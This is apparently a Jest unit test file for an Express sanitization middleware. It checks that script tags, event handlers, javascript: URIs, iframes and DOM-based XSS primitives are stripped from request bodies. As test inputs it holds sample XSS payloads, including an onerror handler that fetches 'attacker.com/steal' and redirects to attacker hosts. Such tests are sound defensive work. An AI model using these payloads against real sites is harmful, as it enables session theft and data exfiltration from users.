"use strict";

/**
 * HTML Sanitization Middleware Unit Tests
 *
 * Tests XSS prevention through sanitization.
 *
 * Security contract:
 *
 * - executable HTML must be removed
 * - script contents must not survive as executable text
 * - event handlers must be removed
 * - javascript: URIs must be removed
 * - DOM-based XSS primitives must be removed
 * - nested objects and arrays must be sanitized recursively
 * - non-string values must remain unchanged
 */

const {
  sanitizeString,
  sanitizeObject,
  sanitizationMiddleware,
} =
  require(
    "../../middleware/sanitizationMiddleware"
  );

describe(
  "Sanitization Middleware XSS Prevention",
  () => {
    // =========================================================================
    // SANITIZE STRING
    // =========================================================================

    describe(
      "sanitizeString function",
      () => {
        test(
          "should remove script tags and script contents from input",
          () => {
            const input =
              'Hello <script>alert("XSS")</script> World';

            const result =
              sanitizeString(
                input
              );

            expect(
              result
            )
              .not
              .toContain(
                "<script>"
              );

            expect(
              result
            )
              .not
              .toContain(
                "alert"
              );

            expect(
              result
            )
              .toContain(
                "Hello"
              );

            expect(
              result
            )
              .toContain(
                "World"
              );
          }
        );

        test(
          "should remove event handler attributes",
          () => {
            const inputs = [
              '<img src="x" onerror="alert(1)">',

              '<div onclick="stolen()">Click</div>',

              '<body onload="malicious()">',
            ];

            inputs.forEach(
              (
                input
              ) => {
                const result =
                  sanitizeString(
                    input
                  );

                expect(
                  result
                    .toLowerCase()
                )
                  .not
                  .toMatch(
                    /\bon(error|click|load)\s*=/
                  );
              }
            );
          }
        );

        test(
          "should remove javascript URIs",
          () => {
            const jsLink =
              '<a href="javascript:alert(1)">Click</a>';

            const result =
              sanitizeString(
                jsLink
              );

            expect(
              result
                .toLowerCase()
            )
              .not
              .toContain(
                "javascript:"
              );
          }
        );

        test(
          "should remove dangerous iframe contents",
          () => {
            const input =
              '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>';

            const result =
              sanitizeString(
                input
              );

            expect(
              result
            )
              .not
              .toContain(
                "<iframe"
              );

            expect(
              result
            )
              .not
              .toContain(
                "alert"
              );
          }
        );

        test(
          "should remove executable script inside normal text",
          () => {
            const input =
              'before<script>alert("xss")</script>after';

            const result =
              sanitizeString(
                input
              );

            expect(
              result
            )
              .toBe(
                "beforeafter"
              );
          }
        );

        test(
          "should handle null and empty strings gracefully",
          () => {
            expect(
              sanitizeString(
                null
              )
            )
              .toBeNull();

            expect(
              sanitizeString(
                undefined
              )
            )
              .toBeUndefined();

            expect(
              sanitizeString(
                ""
              )
            )
              .toBe(
                ""
              );

            expect(
              sanitizeString(
                "safe text"
              )
            )
              .toBe(
                "safe text"
              );
          }
        );

        test(
          "should not modify non-string values",
          () => {
            expect(
              sanitizeString(
                123
              )
            )
              .toBe(
                123
              );

            expect(
              sanitizeString(
                true
              )
            )
              .toBe(
                true
              );

            expect(
              sanitizeString(
                {}
              )
            )
              .toEqual(
                {}
              );
          }
        );

        test(
          "should remove DOM-based XSS primitives",
          () => {
            const payloads = [
              "document.location='https://attacker.test'",

              "window.open('https://attacker.test')",

              "eval('malicious()')",

              "innerHTML='<script>bad()</script>'",

              "outerHTML='<img onerror=bad()>'",
            ];

            payloads.forEach(
              (
                payload
              ) => {
                const result =
                  sanitizeString(
                    payload
                  );

                expect(
                  result
                )
                  .not
                  .toMatch(
                    /document\s*\.\s*location/i
                  );

                expect(
                  result
                )
                  .not
                  .toMatch(
                    /window\s*\.\s*open/i
                  );

                expect(
                  result
                )
                  .not
                  .toMatch(
                    /\beval\s*\(/i
                  );

                expect(
                  result
                )
                  .not
                  .toMatch(
                    /\binnerHTML\s*=/i
                  );

                expect(
                  result
                )
                  .not
                  .toMatch(
                    /\bouterHTML\s*=/i
                  );
              }
            );
          }
        );
      }
    );

    // =========================================================================
    // SANITIZE OBJECT
    // =========================================================================

    describe(
      "sanitizeObject function",
      () => {
        test(
          "should recursively sanitize all string values",
          () => {
            const dirtyObject = {
              notes:
                "text <script>bad</script>",

              description:
                'has onclick="steal()"',

              nested: {
                title:
                  "<img src=x onerror=alert(1)>",

                safe:
                  "clean",
              },
            };

            const sanitized =
              sanitizeObject(
                dirtyObject
              );

            expect(
              sanitized.notes
            )
              .not
              .toContain(
                "<script>"
              );

            expect(
              sanitized.notes
            )
              .not
              .toContain(
                "bad"
              );

            expect(
              sanitized
                .description
            )
              .not
              .toMatch(
                /onclick\s*=/i
              );

            expect(
              sanitized
                .nested
                .title
            )
              .not
              .toMatch(
                /onerror\s*=/i
              );

            expect(
              sanitized
                .nested
                .safe
            )
              .toBe(
                "clean"
              );
          }
        );

        test(
          "should preserve non-string fields",
          () => {
            const data = {
              text:
                "<script>bad</script>",

              number:
                123,

              boolean:
                true,

              null:
                null,

              undefined:
                undefined,
            };

            const result =
              sanitizeObject(
                data
              );

            expect(
              result.number
            )
              .toBe(
                123
              );

            expect(
              result.boolean
            )
              .toBe(
                true
              );

            expect(
              result.null
            )
              .toBeNull();

            expect(
              result.undefined
            )
              .toBeUndefined();
          }
        );

        test(
          "should handle arrays and complex structures",
          () => {
            const data = {
              items: [
                "safe",

                "<script>danger</script>",

                "another safe",

                {
                  description:
                    '<img src=x onerror="attack()">',
                },
              ],
            };

            const result =
              sanitizeObject(
                data
              );

            expect(
              Array.isArray(
                result.items
              )
            )
              .toBe(
                true
              );

            expect(
              result.items[0]
            )
              .toBe(
                "safe"
              );

            expect(
              result.items[1]
            )
              .not
              .toContain(
                "danger"
              );

            expect(
              result.items[2]
            )
              .toBe(
                "another safe"
              );

            expect(
              result.items[3]
                .description
            )
              .not
              .toMatch(
                /onerror\s*=/i
              );
          }
        );

        test(
          "should support selective field sanitization",
          () => {
            const data = {
              userInput:
                "<script>bad</script>",

              metadata:
                "<img onerror=alert(1)>",

              system:
                "<system-tag>",
            };

            const result =
              sanitizeObject(
                data,
                [
                  "userInput",
                  "metadata",
                ]
              );

            expect(
              result.userInput
            )
              .not
              .toContain(
                "<script>"
              );

            expect(
              result.userInput
            )
              .not
              .toContain(
                "bad"
              );

            expect(
              result.metadata
            )
              .not
              .toMatch(
                /onerror\s*=/i
              );

            expect(
              result.system
            )
              .toBe(
                "<system-tag>"
              );
          }
        );
      }
    );

    // =========================================================================
    // EXPRESS MIDDLEWARE
    // =========================================================================

    describe(
      "sanitizationMiddleware express integration",
      () => {
        let req;
        let res;
        let next;

        beforeEach(
          () => {
            req = {
              method:
                "POST",

              body:
                {},

              is:
                jest.fn(
                  () =>
                    false
                ),
            };

            res = {};

            next =
              jest.fn();
          }
        );

        test(
          "should skip GET requests",
          () => {
            req.method =
              "GET";

            req.body = {
              xss:
                "<script>alert(1)</script>",
            };

            const middleware =
              sanitizationMiddleware();

            middleware(
              req,
              res,
              next
            );

            expect(
              next
            )
              .toHaveBeenCalled();

            expect(
              req.body.xss
            )
              .toContain(
                "<script>"
              );
          }
        );

        test(
          "should sanitize POST requests",
          () => {
            req.body = {
              feedback:
                "<script>steal()</script>",

              notes:
                'onclick="hack()"',
            };

            const middleware =
              sanitizationMiddleware();

            middleware(
              req,
              res,
              next
            );

            expect(
              next
            )
              .toHaveBeenCalled();

            expect(
              req.body.feedback
            )
              .not
              .toContain(
                "<script>"
              );

            expect(
              req.body.feedback
            )
              .not
              .toContain(
                "steal"
              );

            expect(
              req.body.notes
            )
              .not
              .toMatch(
                /onclick\s*=/i
              );
          }
        );

        test(
          "should sanitize PUT requests",
          () => {
            req.method =
              "PUT";

            req.body = {
              policyYaml:
                "data <img src=x onerror=alert(1)>",
            };

            const middleware =
              sanitizationMiddleware();

            middleware(
              req,
              res,
              next
            );

            expect(
              next
            )
              .toHaveBeenCalled();

            expect(
              req.body.policyYaml
            )
              .not
              .toContain(
                "onerror"
              );
          }
        );

        test(
          "should sanitize PATCH requests",
          () => {
            req.method =
              "PATCH";

            req.body = {
              description:
                "<script>alert(1)</script>",
            };

            const middleware =
              sanitizationMiddleware();

            middleware(
              req,
              res,
              next
            );

            expect(
              next
            )
              .toHaveBeenCalled();

            expect(
              req.body.description
            )
              .not
              .toContain(
                "<script>"
              );

            expect(
              req.body.description
            )
              .not
              .toContain(
                "alert"
              );
          }
        );

        test(
          "should skip empty request bodies",
          () => {
            req.body =
              null;

            const middleware =
              sanitizationMiddleware();

            middleware(
              req,
              res,
              next
            );

            expect(
              next
            )
              .toHaveBeenCalled();
          }
        );

        test(
          "should continue request processing after sanitization",
          () => {
            req.body = {
              text:
                "<div>normal</div>",
            };

            const middleware =
              sanitizationMiddleware();

            middleware(
              req,
              res,
              next
            );

            expect(
              next
            )
              .toHaveBeenCalledTimes(
                1
              );
          }
        );
      }
    );

    // =========================================================================
    // SECURITY SCENARIOS
    // =========================================================================

    describe(
      "Security scenarios",
      () => {
        test(
          "should prevent stored XSS in feedback notes",
          () => {
            const feedback = {
              notes:
                '<img src="x" onerror="fetch(\'https://attacker.com/steal\')">',
            };

            const sanitized =
              sanitizeObject(
                feedback
              );

            expect(
              sanitized.notes
            )
              .not
              .toContain(
                "onerror"
              );

            expect(
              sanitized.notes
            )
              .not
              .toContain(
                "fetch"
              );
          }
        );

        test(
          "should prevent reflected XSS in policy descriptions",
          () => {
            const policy = {
              description:
                '"><script>document.location="https://attacker.com"</script><"',
            };

            const sanitized =
              sanitizeObject(
                policy
              );

            expect(
              sanitized
                .description
            )
              .not
              .toContain(
                "<script>"
              );

            expect(
              sanitized
                .description
            )
              .not
              .toContain(
                "document.location"
              );
          }
        );

        test(
          "should prevent DOM-based XSS through innerHTML",
          () => {
            const query = {
              search:
                '<svg onload="document.body.innerHTML=\'<h1>XSS</h1>\'">',
            };

            const sanitized =
              sanitizeObject(
                query
              );

            expect(
              sanitized.search
            )
              .not
              .toContain(
                "onload"
              );

            expect(
              sanitized.search
            )
              .not
              .toContain(
                "innerHTML"
              );
          }
        );
      }
    );
  }
);